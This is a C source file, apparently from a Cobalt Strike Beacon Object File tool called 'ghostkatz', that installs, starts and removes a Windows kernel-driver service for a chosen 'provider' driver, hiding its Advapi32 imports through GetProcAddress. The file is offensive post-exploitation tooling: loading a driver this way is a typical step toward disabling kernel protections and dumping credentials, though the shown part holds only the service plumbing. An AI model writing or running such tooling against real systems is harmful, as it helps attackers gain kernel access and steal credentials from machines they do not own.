#include <windows.h>

#include "beacon.h"
#include "provider.h"
#include "ghostkatz.h"
#include "services.h"


BOOL removeService(void)
{
    fnOpenSCManagerA pOpenSCManagerA = (fnOpenSCManagerA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenSCManagerA");
    fnOpenServiceA pOpenServiceA = (fnOpenServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenServiceA");
    fnCloseServiceHandle pCloseServiceHandle = (fnCloseServiceHandle)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "CloseServiceHandle");
    fnControlService pControlService = (fnControlService)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "ControlService");
    fnDeleteService pDeleteService = (fnDeleteService)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "DeleteService");

    PROVIDER_INFO* prov_info = GetProviderInfo(provider);

    const char* drvBasePath = "C:\\Windows\\System32\\drivers\\";
    const char* drvName = prov_info->service_name;
    const char* drvFileName = prov_info->driver_filename;
    char drvFullPath[MAX_PATH];
    sprintf(drvFullPath, "%s%s", drvBasePath, drvFileName);


    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to open SCM!\n");
        return FALSE;
    }

    SC_HANDLE hServiceObject = pOpenServiceA(hSCManager, prov_info->service_name, SERVICE_ALL_ACCESS);
    if (hServiceObject == NULL)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Could not open handle to service!\n");
        pCloseServiceHandle(hSCManager);
        return FALSE;
    }


    SERVICE_STATUS ServiceStatus;
    BOOL status = pControlService(hServiceObject, SERVICE_CONTROL_STOP, &ServiceStatus);
    DWORD ErrorCode = GetLastError();
    if (status || ServiceStatus.dwCurrentState == SERVICE_STOPPED)
    {
        if (pDeleteService(hServiceObject))
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Deleted driver service!\n");
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to delete service!\n");
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to stop service!\n");
    }
    
    
    pCloseServiceHandle(hServiceObject);
    pCloseServiceHandle(hSCManager);

    return TRUE;
}


BOOL isServiceInstalled(void)
{
    fnOpenSCManagerA pOpenSCManagerA = (fnOpenSCManagerA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenSCManagerA");
    fnOpenServiceA pOpenServiceA = (fnOpenServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenServiceA");
    fnCreateServiceA pCreateServiceA = (fnCreateServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "CreateServiceA");
    fnQueryServiceStatus pQueryServiceStatus = (fnQueryServiceStatus)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "QueryServiceStatus");
    fnStartServiceA pStartServiceA = (fnStartServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "StartServiceA");
    fnCloseServiceHandle pCloseServiceHandle = (fnCloseServiceHandle)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "CloseServiceHandle");

    PROVIDER_INFO* prov_info = GetProviderInfo(provider);

    const char* drvBasePath = "C:\\Windows\\System32\\drivers\\";
    const char* drvName = prov_info->service_name;
    const char* drvFileName = prov_info->driver_filename;
    char drvFullPath[MAX_PATH];
    sprintf(drvFullPath, "%s%s", drvBasePath, drvFileName);

    //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Driver path: %s", drvFullPath);

    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to open SCM!\n");
        return FALSE;
    }

    SC_HANDLE hServiceObject = pOpenServiceA(hSCManager, prov_info->service_name, SERVICE_ALL_ACCESS);
    if (hServiceObject == NULL)
    {
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            hServiceObject = pCreateServiceA(
                hSCManager,
                prov_info->service_name,
                prov_info->service_name,
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE,
                drvFullPath,
                NULL, NULL, NULL, NULL, ""
            );

            if (hServiceObject == NULL)
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to create driver service! 0x%lx\n", GetLastError());
                pCloseServiceHandle(hSCManager);
                return FALSE;
            }
            else
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Created driver service!\n");
            }
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to open service object! 0x%lx\n", GetLastError());
            pCloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Found pre-existing driver service.\n");
    }


    if (!pStartServiceA(hServiceObject, 0, NULL))
    {
        if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Service already running.\n");
            pCloseServiceHandle(hServiceObject);
            pCloseServiceHandle(hSCManager);
            return TRUE;
        }
        else
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to start service: 0x%lx\n", GetLastError());
            pCloseServiceHandle(hServiceObject);
            pCloseServiceHandle(hSCManager);

            if (!removeService())
            {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to remove driver service!\n");
            }

            return FALSE;
        }
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Started driver service.\n");
        pCloseServiceHandle(hServiceObject);
        pCloseServiceHandle(hSCManager);
        return TRUE;
    }


    return TRUE;
}